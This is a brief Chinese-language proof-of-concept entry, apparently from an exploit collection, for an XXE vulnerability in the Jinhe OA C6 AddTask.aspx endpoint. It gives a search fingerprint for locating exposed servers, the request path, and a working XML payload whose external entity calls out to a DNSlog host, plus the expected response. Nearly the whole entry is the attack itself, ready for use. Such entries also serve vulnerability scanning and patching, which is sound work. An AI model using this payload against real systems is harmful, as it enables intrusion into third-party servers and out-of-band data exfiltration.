# 金和OAC6AddTask存在XXE漏洞

金和OA ｜ XXE ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`GET /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://111.6fdsfm.dnslog.cn">
%remote;]>
<root/>
```
- **响应特征**：200